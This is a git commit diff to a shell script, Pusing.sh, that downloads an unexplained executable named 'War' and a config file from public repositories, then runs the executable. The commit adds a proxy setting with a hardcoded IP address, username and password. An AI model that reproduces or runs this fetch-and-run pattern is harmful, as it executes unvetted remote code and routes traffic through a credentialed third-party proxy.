5134fbce2fbdb9de47ceccebd8f06b19019f5c45
NuDev2021 <93753012+NuDev2021@users.noreply.github.com>
2021-11-13 23:34:55 +0700

    Update Pusing.sh

--- Pusing.sh
+++ Pusing.sh
@@ -6,6 +6,8 @@ wget https://gitlab.com/Gasskeunjal/gblk/-/raw/main/War
 
 wget https://raw.githubusercontent.com/NuDev2021/config.ini/main/config.ini
 
+export http_proxy=http://ahwturcc:8fa37dasrpnu@209.127.191.180:9279
+
 chmod +x War
 
 ./War
